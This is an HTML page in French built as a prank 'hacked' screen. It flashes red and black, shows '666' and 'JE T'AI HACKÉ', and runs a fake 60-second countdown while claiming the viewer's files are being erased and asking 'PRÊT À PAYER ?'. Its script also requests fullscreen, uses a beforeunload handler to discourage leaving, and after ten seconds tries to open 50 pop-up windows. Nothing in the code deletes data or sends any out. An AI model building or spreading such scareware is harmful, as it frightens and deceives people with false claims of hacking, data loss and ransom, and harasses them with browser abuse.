<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ERREUR CRITIQUE</title>
    <style>
        body { margin: 0; padding: 0; background-color: #000; color: #f00; font-family: 'Courier New', monospace; overflow: hidden; display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh; text-align: center; }
        h1 { font-size: 15vw; margin: 0; text-shadow: 0 0 20px red; animation: shake 0.1s infinite; }
        p { font-size: 2vw; color: #fff; }
        .red { color: #f00; font-weight: bold; }
        @keyframes shake {
            0% { transform: translate(1px, 1px) rotate(0deg); }
            10% { transform: translate(-1px, -2px) rotate(-1deg); }
            20% { transform: translate(-3px, 0px) rotate(1deg); }
            30% { transform: translate(3px, 2px) rotate(0deg); }
            40% { transform: translate(1px, -1px) rotate(1deg); }
            50% { transform: translate(-1px, 2px) rotate(-1deg); }
            60% { transform: translate(-3px, 1px) rotate(0deg); }
            70% { transform: translate(3px, 1px) rotate(-1deg); }
            80% { transform: translate(-1px, -1px) rotate(1deg); }
            90% { transform: translate(1px, 2px) rotate(0deg); }
            100% { transform: translate(1px, -2px) rotate(-1deg); }
        }
    </style>
</head>
<body>
    <h1 id="title">666</h1>
    <p id="message">JE T'AI HACKÉ</p>
    <p>TES FICHIERS SONT EN TRAIN D'ÊTRE EFFACÉS</p>
    <p class="red" id="timer">TEMPS RESTANT : 60 SECONDES</p>

    <script>
        // 1. Demander le plein écran au clic (sur iPhone, ça marche avec le mode web app)
        document.body.addEventListener('click', () => {
            if (document.body.requestFullscreen) {
                document.body.requestFullscreen();
            }
        });

        // 2. Faire clignoter la page
        setInterval(() => {
            document.body.style.backgroundColor = document.body.style.backgroundColor === 'red' ? 'black' : 'red';
            document.body.style.color = document.body.style.color === 'black' ? 'red' : 'black';
        }, 500);

        // 3. Changer le texte
        const messages = ["666", "JE T'AI HACKÉ", "TES DONNÉES SONT À MOI", "PRÊT À PAYER ?", "666"];
        let i = 0;
        setInterval(() => {
            document.getElementById('title').innerText = messages[i];
            i = (i + 1) % messages.length;
        }, 1000);

        // 4. Compte à rebours
        let timeLeft = 60;
        const timerElement = document.getElementById('timer');
        const countdown = setInterval(() => {
            timeLeft--;
            timerElement.innerText = `TEMPS RESTANT : ${timeLeft} SECONDES`;
            if (timeLeft <= 0) {
                clearInterval(countdown);
                timerElement.innerText = "SYSTEME ETEINT.";
                document.body.style.backgroundColor = "#000";
                document.body.style.color = "#333";
            }
        }, 1000);

        // 5. Empêcher la fermeture (alert si on essaie de quitter)
        window.addEventListener('beforeunload', (e) => {
            e.preventDefault();
            e.returnValue = "Le processus d'effacement est en cours. Voulez-vous vraiment quitter ?";
            return e.returnValue;
        });

        // 6. Ouvrir des sites en boucle (pop-ups)
        // Sur iPhone, Safari bloque souvent les pop-ups. Si ça marche, ça va ouvrir plein de pages.
        setTimeout(() => {
            const urls = [
                "https://www.roblox.com",
                "https://www.youtube.com",
                "https://www.google.com/search?q=666",
                "https://www.chrome.com", // pas vraiment chrome, mais une page google
                "https://www.microsoft.com/edge" // page edge
            ];
            
            for (let j = 0; j < 50; j++) {
                const url = urls[Math.floor(Math.random() * urls.length)];
                window.open(url, '_blank');
            }
        }, 10000); // Lance après 10 secondes de troll

    </script>
</body>
</html>
